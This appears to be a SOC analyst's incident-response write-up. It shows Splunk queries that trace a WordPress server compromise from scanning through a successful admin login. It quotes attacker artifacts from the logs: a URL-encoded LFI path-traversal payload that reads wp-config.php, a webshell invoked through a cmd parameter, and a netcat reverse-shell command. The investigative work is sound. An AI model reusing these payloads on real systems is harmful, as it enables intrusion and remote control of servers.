# Content
1. [Scenario](#scenario)
2. [Incident Response Narrative](#incident-response)
3. [Lessons Learned](#lessons-learned)

## 1. Scenario<a id='scenario'></a>
As per advisory from external threat intelligence, a cybersecurity engineer urgently configured a rudimentary update of the signature-based rules on the endpoint security solution. Then from the endpoint security solution, SOC was alerted there was match for IP address (23[.]254[.]226[.]90) on the web server hosting the organization’s corporate website. Although based on the threat intelligence, this IP address is an indicator-of-comprise (IOC) that was just known to be malicious in the wild, the match was based from past events/logs on the web server before the IOC was added to the signature-based rule. Due to a technical bug on the endpoint security solution, its logs cannot be remotely acquired by the SOC analyst for investigation. However, since the logs from the web server are piped to the Security Information and Event Management (SIEM) solution as well, the SOC analyst can use the SIEM to investigate this. In this security architecture, the SIEM solution used here is Splunk Enterprise.
<br>

### Key concerns from stakeholders: 
I.	Has the web server already been compromised before the alert? <br>
II.	Did the adversary breach into the internal network? <br>
III.	What could have been done to detect this even before the ingestion of IOCs from external threat intelligence?

## 2. Incident Response Narrative<a id='incident-response'></a>
### 2.1. Identification

### Identification source: SIEM

SOC searched on the SIEM (Splunk Search) with a date/time range that covers the period which the match for the IP address was detected on the EDR.
Then a general query with the specific index (XXXX-web) and host name (WEB-XXXX-01) for the web server in question.

<br> Splunk Query: ```index="XXXX-web" host="WEB-XXXX-01" ``` <br>

As per below screenshot, the logs which are piped from the web server to the SIEM are *access.log*.

<img width="848" height="537" alt="image" src="https://github.com/user-attachments/assets/13ec5732-e926-4aab-aba5-a321e1c5e68e" />

Using the *Interesting Fields* feature under *clientip*,  SOC observed that the IP address 23[.]254[.]226[.]90 from external threat intelligence has abnormal high log volume on the web server within this time as compared to the other client IP addresses.
<img width="1220" height="531" alt="image" src="https://github.com/user-attachments/assets/94d5f7e1-05a8-4b8a-85a6-da268b06021a" />


This suggests that 23[.]254[.]226[.]90 had accessed the webserver the most during that period which is highly suspicious.
>Analyst notes: The first thing that comes to mind from such high volume of web requests are either attempts for brute-force attack or Denial-of-Service (DoS) attackers.
Then SOC did a search for 23[.]254[.]226[.]90 on VirusTotal to check its reputation.

<img width="1024" height="534" alt="image" src="https://github.com/user-attachments/assets/6671b4a4-ea20-4a16-b684-5440a439f691" />

From the above VT results, there is high confidence that web requests originates from a less reputable IP address at the time of investigation.

However, since the server's web service is exposed to the public Internet to serve its function hosting the website, having high traffic volume from less reputable public IP addresses may not neccessarily indicate a true positive incident.
Therefore, the analyst investigated further to find concrete evidence of compromise.

The analyst further queried and piped the results to be formatted into a table with useful fields for HTTP requests using the fields table _time, clientip, method, uri, useragent, and sort them in chronological order using sort _time.


<br> Splunk Query: 
```index="XXXX-web" host="WEB-XXXX-01" clientip="23.254.226.90" | table _time, clientip, method, uri, useragent | sort _time ``` <br>
<img width="1611" height="713" alt="image" src="https://github.com/user-attachments/assets/d3050f03-d58a-4c9d-8f89-45cdf4d40968" />

There is useragent field “WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)”. This indicates the use of vulnerability scanner on the web server. 
Then the analyst used the useragent field as a point of reference to further investigate by listing out the top five user agents.


<br> Splunk Query: 
```index="XXXX-web" host="WEB-XXXX-01" clientip="23.254.226.90" | table _time, clientip, method, uri, useragent | sort _time | top limit=5 useragent``` <br>
<img width="1645" height="378" alt="image" src="https://github.com/user-attachments/assets/17fb8c74-fd73-4f47-a490-194d0e3e5553" />

The above query output indicated that most web traffic comes from WPScan and GoBuster (software tool for brute forcing directories on web servers). Legitimate user web traffic should not have user agents as such, unless there is malicious intent.

With the IP address’ negative reputation on VirusTotal, along with evidence of significant traffic indicating both vulnerability scanning and web directory brute forcing, this confirms that 23[.]254[.]226[.]90 is indeed an adversary’s IP probing on the webserver.
At this stage, 23[.]254[.]226[.]90 can be confidently blocked using perimeter firewalls, IPS etc. to prevent any further probing from the source. 
However, the analyst dived deeper to find evidence on whether the server had been compromised prior to this investigation.

Based on the analyst's knowledge of the enterprise environment and WordPress (the tech stack running of web server application), there are three fields in *access.log* which could indicate compromise with the below reasoning:
1. HTTP request method (*method* field)
2. HTTP request URI path (*uri* field).
3. HTTP response status code (*status* field).

Hence, from the Splunk query, the following log entry stands out:
1. *method* field is *POST*
2. *uri* field is */wplogin.php*
3. *status* field is *302*

As per below screenshot, a server response status code 302 for client request for POST /wplogin.php indicated that the attacker from 23[.]254[.]226[.]90 had a successful login via valid credentials to gain unauthorized to the admin panel. 
This is as opposed to all previous POST /wplogin.php with response code of 200, which indicated failed login attempts.

In a chronological order, the analyst also observed a LFI exploitation 23[.]254[.]226[.]90 using the URI */bank-withus/?file=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fvar%2Fwww%2Fhtml%2Fwp%2Dconfig.php which is URL-encoded for /bank-withus/?file=../../../../../../../../../var/www/html/wp-config.php.

<img width="1234" height="532" alt="image" src="https://github.com/user-attachments/assets/e2e78a6d-73c7-4314-a03c-0062aa79db1d" />

This incidates that there was a successful LFI exploitation which revealed web admin login credentials to the attacker. 
The analyst also tested this in the QA environment for the web server to verify this behaviour and prove the LFI vulnerability exist.
<br>
At this point of time, it is confirmed that the web server had been compromised.
>Analyst notes: SOC have strong justification to activate the Incident Response (IR) team at this time and move into the containment phase.

To further scope what was done in the web server after the attacker logged into the admin panel, further investigation was conducted.

In a chronological order, as per below screenshots, the analyst observed that the logs indicate after the successful login into the admin panel, the
attacker was observed to be uploading, installing and activating of a WordPress plug-in named *“wp_webshell”*.

<img width="1227" height="521" alt="image" src="https://github.com/user-attachments/assets/d78645c4-cea6-469a-91c1-0bceef19d28c" />

Then it was observed that the then the attacker began using the wp_webshell plugin to perform remote code execution on the web server via HTTP GET requests with URI */wp_webshell.php?cmd=<command>*. 
The attacker ran commands to performing system enumeration on the webserver including the following: *whoami*, *hostname*, *ls* and *which nc*.
Then the logs indicated that the attacker ran a remote command *“nc -c /bin/sh X.X.X.X 3443”* to use a netcat tool to establish a connection back to another IP X.X.X.X at destination port 3443.
This was to establish a reverse shell so that they can control the web server.

<img width="1224" height="390" alt="image" src="https://github.com/user-attachments/assets/433f8d50-2268-49ab-9935-fa11d4a81b74" />

### 2.2. Containment
### 2.3. Eradication
### 2.4. Recovery

## 3. Lessons Learned<a id='lessons-learned'></a>
